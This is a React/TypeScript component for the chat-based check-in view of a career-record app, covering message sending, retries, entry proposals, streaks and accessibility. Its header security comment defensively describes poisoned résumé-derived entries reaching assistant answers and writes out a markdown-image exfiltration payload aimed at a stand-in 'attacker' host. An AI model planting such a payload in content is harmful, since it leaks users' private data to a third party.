import { useCallback, useEffect, useMemo, useRef, useState } from "react";
import { postChat, type AnswerSource, type EntryCandidate, type Entry } from "../lib/api";
import { ulid } from "../lib/ulid";
import {
  CADENCE_NOUN,
  categoryCounts,
  computeStreak,
  loggedThisPeriod,
  mostRecentEntry,
  orgOf,
  periodStart,
  relativeSince,
  type Cadence,
} from "../lib/aggregates";
import { LOG_CHIPS, MAX_MESSAGE_CHARS, isoWeek } from "../lib/composer";
import { ProposalCard } from "./ProposalCard";
import "./chat.css";

/**
 * The Log — the check-in conversation (FR-2 ingestion + FR-6.1 Q&A, Section 3.1 / ADR-038), rebuilt
 * for the v1.1 redesign. Free-form message in; a clarifying question, a reviewable entry proposal, or
 * a grounded answer over the user's own history out. Nothing persists until the user confirms on the
 * ProposalCard.
 *
 * Retry story (ADR-032): each send mints a `client_message_id` ULID reused verbatim on retry, so a
 * retried turn never duplicates in CONVO history or replayed prompts. `session_id` arrives with the
 * first response and is echoed on every later turn.
 *
 * SECURITY — assistant text is rendered as a text node, never as HTML or markdown, and this is
 * load-bearing rather than a styling preference (ADR-038, arch §4.2.3). An answer is synthesised
 * from the user's stored entries, and entry content can originate in an uploaded résumé (slice 5)
 * — i.e. it is not fully trusted. React escapes `{turn.text}`, so injected markup is inert. Swap
 * in a markdown renderer and `![](https://attacker/?d=...)` in a poisoned entry would exfiltrate
 * on image load. If rich formatting is ever wanted, it needs a sanitizing renderer with images and
 * links disabled — not a drop-in component. See backlog B-012.
 *
 * ACCESSIBILITY — four audit findings are fixed here, none of which were visible by inspection:
 * §A4 the transcript is a `role="log"` live region, so replies are announced rather than appearing
 * silently; §A5 every message carries a visually-hidden role label, since "who said this" was
 * conveyed by bubble alignment alone; §A6 the typing indicator announces as words, not as a literal
 * "…"; §A7 the retry button names the message it will resend, so it is not an unattached "Retry".
 */

type Turn =
  | { id: string; role: "user"; text: string; failed?: boolean }
  | { id: string; role: "assistant"; text: string; isError?: boolean; sources?: AnswerSource[] }
  | { id: string; role: "proposal"; candidate: EntryCandidate }
  /**
   * `total` and `streak` are frozen at save time rather than read live at render.
   *
   * A chat message is a record of a moment, so it must not change after the user has read it —
   * rendering the count live meant the *first* confirmation silently rewrote itself when a second
   * entry was saved. Freezing also avoids understating by one for the ~3.6s the shell's refetch
   * takes, and avoids being permanently wrong if that refetch fails.
   */
  | { id: string; role: "note"; entryType: string; title: string; total: number; streak: number };

/** The design shows chips only until the conversation is under way. */
const CHIP_LIMIT = 3;

const PANEL_DATE = new Intl.DateTimeFormat("en-GB", {
  weekday: "short",
  day: "numeric",
  month: "short",
});
const TODAY_WEEKDAY = new Intl.DateTimeFormat("en-GB", { weekday: "long" });

/**
 * Period starts are UTC-anchored midnights (`periodStart` builds them off `Date.UTC`), so they must
 * be *formatted* in UTC too. Formatting them locally renders Monday 00:00 UTC as Sunday evening for
 * every user west of Greenwich — the label would have read "Logged since Sunday" for a week that
 * starts on Monday, which is wrong in a way that looks like a design choice rather than a bug.
 */
const PERIOD_WEEKDAY = new Intl.DateTimeFormat("en-GB", { weekday: "long", timeZone: "UTC" });
const PERIOD_MONTH_DAY = new Intl.DateTimeFormat("en-GB", {
  day: "numeric",
  month: "short",
  timeZone: "UTC",
});

/** Short enough to name a message in a button label without reading the whole thing aloud. */
function excerpt(text: string, max = 48): string {
  const clean = text.trim().replace(/\s+/g, " ");
  return clean.length <= max ? clean : `${clean.slice(0, max - 1)}…`;
}

/**
 * The opening check-in question.
 *
 * The handoff fixes one sentence per cadence ("It's been a week since you logged the GenAI
 * training…"), with a production note to reference the user's real most-recent entry. That note is
 * followed here, and extended to the other half of the sentence: the elapsed time is measured rather
 * than assumed, because "it's been a week" is false for anyone who logged something yesterday, and a
 * check-in that opens by misstating the user's own history undermines the thing it is asking about.
 * See `relativeSince`.
 */
function openingQuestion(entries: Entry[], cadence: Cadence, now: Date): string {
  const latest = mostRecentEntry(entries);
  if (!latest) {
    return "Nothing in the vault yet — what have you been working on? A single line is enough to start.";
  }

  const at = new Date(String(latest.created_at));
  const ago = relativeSince(at, now);
  const title = latest.title;

  if (!ago) return `You logged ${title} today — has anything else landed?`;
  if (cadence === "monthly" || cadence === "quarterly") {
    return `It's been ${ago} since ${title} landed — what has moved since?`;
  }
  return `It's been ${ago} since you logged ${title} — what have you been working on?`;
}

export function Chat({
  idToken,
  initialDraft = "",
  entries,
  cadence,
  onEntrySaved,
}: {
  idToken: string;
  initialDraft?: string;
  entries: Entry[] | null;
  cadence: Cadence;
  onEntrySaved?: () => void;
}) {
  const [turns, setTurns] = useState<Turn[]>([]);
  const [draft, setDraft] = useState(initialDraft);
  const [sending, setSending] = useState(false);
  const [showActivity, setShowActivity] = useState(true);
  const sessionIdRef = useRef<string | undefined>(undefined);
  const scrollRef = useRef<HTMLDivElement>(null);

  const now = useMemo(() => new Date(), []);
  const rows = useMemo(() => entries ?? [], [entries]);
  const noun = CADENCE_NOUN[cadence];

  const streak = useMemo(() => computeStreak(rows, cadence, now), [rows, cadence, now]);
  const recent = useMemo(() => loggedThisPeriod(rows, cadence, now), [rows, cadence, now]);
  const categories = useMemo(() => categoryCounts(rows), [rows]);
  const opening = useMemo(() => openingQuestion(rows, cadence, now), [rows, cadence, now]);

  // Height changes when the sidebar is toggled, so the transcript is re-pinned to the bottom on that
  // too — otherwise expanding the panel scrolls the newest message out of view.
  useEffect(() => {
    // Assigning `scrollTop` rather than calling `scrollTo`: identical effect for an instant jump,
    // and it is a plain property rather than a method that an environment may not implement.
    const el = scrollRef.current;
    if (el) el.scrollTop = el.scrollHeight;
  }, [turns, showActivity]);

  // Stable across renders (only `idToken` can change it), so the auto-send effect below can depend
  // on it honestly instead of reaching for a ref — which would be a ref written during render.
  const send = useCallback(async (text: string, clientMessageId: string) => {
    setSending(true);
    // Clear any failed flag on this turn (it's a retry) or append it (it's new).
    setTurns((prev) => {
      const existing = prev.find((t) => t.id === clientMessageId);
      if (existing) {
        return prev.map((t) => (t.id === clientMessageId ? { ...t, failed: false } : t));
      }
      return [...prev, { id: clientMessageId, role: "user", text }];
    });

    try {
      const response = await postChat(idToken, {
        message: text,
        session_id: sessionIdRef.current,
        client_message_id: clientMessageId,
      });
      sessionIdRef.current = response.session_id;

      if (response.kind === "clarification") {
        setTurns((prev) => [...prev, { id: ulid(), role: "assistant", text: response.question }]);
      } else if (response.kind === "parse_candidate") {
        setTurns((prev) => [...prev, { id: ulid(), role: "proposal", candidate: response.candidate }]);
      } else if (response.kind === "answer") {
        setTurns((prev) => [
          ...prev,
          { id: ulid(), role: "assistant", text: response.answer, sources: response.sources },
        ]);
      } else {
        // Server-side turn failure: the message is already durably stored, so the retry (same
        // client_message_id) costs the user nothing and cannot duplicate.
        setTurns((prev) => [
          ...prev.map((t) => (t.id === clientMessageId ? { ...t, failed: true } : t)),
          { id: ulid(), role: "assistant", text: response.message, isError: true },
        ]);
      }
    } catch {
      // Network failure: nothing rendered from the server; offer retry on the user's bubble.
      setTurns((prev) => prev.map((t) => (t.id === clientMessageId ? { ...t, failed: true } : t)));
    } finally {
      setSending(false);
    }
  }, [idToken]);

  /**
   * Home's composer hands its text over and the conversation opens with it already sent — the
   * handoff's flow, and what slice 1 deferred to here (it seeded the box without sending, because
   * landing mid-flow in an un-redesigned view would have implied a redesign that had not happened).
   *
   * Guarded by a ref rather than by the deps alone: StrictMode double-invokes effects in
   * development, and without the guard the hand-off would send the user's first message twice.
   */
  const autoSent = useRef(false);
  useEffect(() => {
    const seed = initialDraft.trim();
    if (!seed || autoSent.current) return;
    autoSent.current = true;
    setDraft("");
    void send(seed, ulid());
  }, [initialDraft, send]);

  const submit = () => {
    const text = draft.trim();
    if (!text || sending) return;
    setDraft("");
    void send(text, ulid());
  };

  /**
   * Saves made here that the shell's `entries` prop has not caught up with yet.
   *
   * The refetch is asynchronous, so between a save and its arrival `rows.length` is stale by one —
   * and by two if the user saves twice quickly. Counting them locally keeps the confirmation
   * accurate in both cases; the effect below zeroes it once fresh data lands.
   */
  const pendingSaves = useRef(0);
  useEffect(() => {
    pendingSaves.current = 0;
  }, [entries]);

  const onSaved = (entryType: string, title: string) => {
    pendingSaves.current += 1;
    const total = rows.length + pendingSaves.current;
    // The streak can only be *started* by this save, never broken by it, so an unstarted streak
    // becomes 1 and an existing one is unchanged until the refetch recomputes it properly.
    const streakNow = streak.current === 0 ? 1 : streak.current;

    setTurns((prev) => [
      ...prev,
      { id: ulid(), role: "note", entryType, title, total, streak: streakNow },
    ]);
    // Refresh the shell's entry list so the sidebar, status row and header streak reflect the save.
    onEntrySaved?.();
  };

  const periodLabel =
    cadence === "monthly" || cadence === "quarterly"
      ? PERIOD_MONTH_DAY.format(periodStart(now, cadence))
      : PERIOD_WEEKDAY.format(periodStart(now, cadence));

  const statusParts = [
    `${rows.length} ${rows.length === 1 ? "entry" : "entries"}`,
    ...categories.slice(0, 2).map((c) => `${c.count} ${c.label.toLowerCase()}`),
  ];

  return (
    <div className="view log">
      <div className="log-grid" data-activity={showActivity ? "shown" : "hidden"}>
        <section className="chat-panel">
          <div className="panel-head">
            <div className="panel-title">
              <h1>{noun.charAt(0).toUpperCase() + noun.slice(1)}ly check-in</h1>
              <p className="micro panel-date">
                {PANEL_DATE.format(now)} · week {isoWeek(now)}
              </p>
            </div>
            <button
              type="button"
              className="micro panel-toggle"
              aria-expanded={showActivity}
              onClick={() => setShowActivity((v) => !v)}
            >
              {showActivity ? "Hide activity" : "Show activity"}
            </button>
          </div>

          {/* §A4 — `role="log"` marks a live region whose additions are announced in order. Without
              it the assistant's reply lands silently and a screen-reader user has no way to know a
              response arrived at all. */}
          <div
            className="messages"
            ref={scrollRef}
            role="log"
            aria-live="polite"
            aria-label="Conversation"
          >
            <div className="msg prompt">
              <span className="sr-only">CareerVault asked:</span>
              <p className="prompt-q">{opening}</p>
              <p className="prompt-sub">
                Your {noun}ly check-in · {TODAY_WEEKDAY.format(now)}
              </p>
            </div>

            {turns.map((turn) => {
              if (turn.role === "proposal") {
                return (
                  <div key={turn.id} className="msg proposal">
                    <span className="sr-only">CareerVault proposed an entry:</span>
                    <p className="proposal-lead">Here it is as a record — edit anything before it lands:</p>
                    <ProposalCard idToken={idToken} candidate={turn.candidate} onSaved={onSaved} />
                  </div>
                );
              }

              if (turn.role === "note") {
                return (
                  <p key={turn.id} className="msg note">
                    <span className="sr-only">CareerVault noted:</span>
                    {turn.entryType} “{turn.title}” is in your vault — that is {turn.total}{" "}
                    {turn.total === 1 ? "record" : "records"} on deposit, and the streak holds at{" "}
                    {turn.streak} {turn.streak === 1 ? noun : `${noun}s`}.
                  </p>
                );
              }

              if (turn.role === "user") {
                return (
                  <div key={turn.id} className="msg user">
                    <span className="sr-only">You said:</span>
                    <p className="bubble-user">{turn.text}</p>
                    {turn.failed && (
                      <p className="send-failed">
                        {/* §A7 — the button names the message it resends, so it is not an
                            unattached "Retry" in a list of buttons. */}
                        <span className="sr-only">Not sent. </span>
                        <button
                          type="button"
                          className="retry"
                          disabled={sending}
                          aria-label={`Retry sending: ${excerpt(turn.text)}`}
                          onClick={() => void send(turn.text, turn.id)}
                        >
                          Retry
                        </button>
                      </p>
                    )}
                  </div>
                );
              }

              return (
                <div key={turn.id} className={`msg assistant${turn.isError ? " error" : ""}`}>
                  <span className="sr-only">CareerVault said:</span>
                  {/* Text node, not HTML — see the security note in this file's header. */}
                  <p className="bubble-assistant">{turn.text}</p>
                  {turn.sources && turn.sources.length > 0 && (
                    <ul className="answer-sources">
                      {turn.sources.map((source) => (
                        <li key={source.entry_id}>
                          <span className="source-type">{source.entry_type}</span>
                          {source.title}
                        </li>
                      ))}
                    </ul>
                  )}
                </div>
              );
            })}

            {/* §A6 — the dots are decoration; the announcement is the sentence beside them. */}
            {sending && (
              <p className="msg typing" role="status">
                <span className="sr-only">CareerVault is thinking…</span>
                <span className="dots" aria-hidden="true">
                  <span />
                  <span />
                  <span />
                </span>
              </p>
            )}
          </div>

          <form
            className="composer"
            onSubmit={(e) => {
              e.preventDefault();
              submit();
            }}
          >
            {turns.length < CHIP_LIMIT && (
              <div className="chips">
                <span className="chips-label">Not sure where to start</span>
                {LOG_CHIPS.map((chip) => (
                  <button
                    key={chip.label}
                    type="button"
                    className="chip"
                    onClick={() => {
                      setDraft(chip.seed);
                      document.getElementById("log-input")?.focus();
                    }}
                  >
                    {chip.label}
                  </button>
                ))}
              </div>
            )}

            <div className="input-pill">
              {/* §A3 — a real label, not a placeholder standing in for one. */}
              <label className="sr-only" htmlFor="log-input">
                Tell me what happened
              </label>
              {/*
                A `<textarea>`, not an `<input>`, despite the handoff drawing a single-line pill.
                This is the app's primary FR-2 ingestion path and the field advertises a 4000-char
                cap: pasting a multi-paragraph accomplishment into a single-line control silently
                collapses every newline, so what reaches `POST /chat` is not what the user pasted.
                It is styled as the pill and auto-grows to a few lines, so the design's shape is
                kept and the data is not altered. Enter sends; Shift+Enter is a newline.
              */}
              <textarea
                id="log-input"
                rows={1}
                value={draft}
                maxLength={MAX_MESSAGE_CHARS}
                placeholder="Tell me what happened…"
                onChange={(e) => setDraft(e.target.value)}
                onKeyDown={(e) => {
                  if (e.key === "Enter" && !e.shiftKey) {
                    e.preventDefault();
                    submit();
                  }
                }}
              />
              <button type="submit" disabled={sending || !draft.trim()} aria-label="Send message">
                <span aria-hidden="true">↑</span>
              </button>
            </div>

            <p className="status-row">
              <span>{statusParts.join(" · ")}</span>
              <span>
                {streak.current > 0 ? `${streak.current}-${noun} streak` : "No streak yet"}
              </span>
            </p>
          </form>
        </section>

        {showActivity && (
          <aside className="activity" aria-label="Activity">
            <div className="card streak-card">
              <p className="micro card-label">Streak</p>
              <p className="streak-value">
                <strong>{streak.current}</strong>
                <span>
                  {streak.current === 1 ? noun : `${noun}s`} logging
                </span>
              </p>
              <span
                className="streak-bars"
                role="img"
                aria-label={`Last ${streak.recent.length} ${noun}s: ${
                  streak.recent.filter(Boolean).length
                } with an entry`}
              >
                {streak.recent.map((hit, i) => (
                  <span key={i} className={hit ? "bar hit" : "bar"} />
                ))}
              </span>
              <p className="muted">
                {streak.current === 0
                  ? "One entry starts it."
                  : streak.current >= streak.longest
                    ? "Best run yet. One entry keeps it alive."
                    : `Your best is ${streak.longest}. One entry keeps this one alive.`}
              </p>
            </div>

            <div className="card">
              <h2>Logged since {periodLabel}</h2>
              {recent.length === 0 ? (
                <p className="muted">Nothing yet this {noun}.</p>
              ) : (
                <ul className="recent-list">
                  {recent.slice(0, 4).map((entry) => (
                    <li key={entry.entry_id}>
                      <span className="recent-title">{entry.title}</span>
                      {/* `orgOf` walks every org-ish field the schemas use. Checking only
                          `organization`/`issuer` rendered the literal "JOB" for any role, whose
                          field is `employer`. */}
                      <span className="recent-meta">{orgOf(entry) || entry.entry_type}</span>
                    </li>
                  ))}
                </ul>
              )}
            </div>
          </aside>
        )}
      </div>
    </div>
  );
}
